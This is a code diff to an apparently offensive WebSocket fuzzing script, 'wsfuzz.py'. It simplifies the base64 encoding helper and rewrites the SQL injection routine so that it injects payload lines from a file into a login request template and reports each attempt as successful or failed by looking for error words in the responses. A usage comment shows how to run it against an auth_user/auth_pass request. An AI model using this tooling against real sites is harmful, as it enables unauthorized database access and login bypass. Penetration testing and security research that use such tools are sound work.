@@ -49,18 +49,9 @@ def args():
 # return encoded messages based on the selected scheme
 def encoding(encoding_scheme, msg):
     if encoding_scheme == 'base64':
-        return b64(msg)
+        return base64.b64encode(msg.encode('utf-8')).decode('utf-8')
     elif encoding_scheme == 'normal':
         return msg
-
-
-
-# perform base64 encoding
-def b64(payload):
-    msg = payload.encode('utf-8')
-    b64_str = base64.b64encode(msg)
-    msg = b64_str.decode('utf-8')
-    return msg
 
 
 
@@ -94,6 +85,7 @@ def lfi(target, payload, exampleRequest, encode):
 
 # conduct sql injection attack
 def sqli(target, payload, exampleRequest, encode):
+    error_list = ["invalid", "could not", "can't get data", "error", "incorrect"]
     print(f"{GREEN}[+]{RESET} sqli selected! Commencing SQLi attack...")
     print(f"{GREEN}[+]{RESET} {encode} encoding scheme detected!")
     with open (payload, 'r') as payload_file:
@@ -103,7 +95,12 @@ def sqli(target, payload, exampleRequest, encode):
         print("payload: %s" % line)
         newRequest = exampleRequest.replace('*', encoding(encode, line))
         response = w.InteractWithWsSite(target, newRequest)
-        print("response: %s\n" % response)
+        # chk_match = [x for x in error_list if x in response.casefold()]
+        if any([x in response.casefold() for x in error_list]) or response == ' ':
+            print(f"{RED}[-]{RESET} SQL injection failed!\n")
+        else:
+            print(f"{GREEN}[+]{RESET} SQL injection successful!")
+            print("response: %s\n" % response)
 # usage
 # python wsfuzz.py sqli -r '{"auth_user":"*","auth_pass":""}' -p payloads/custom_sqli.txt -e base64    
 
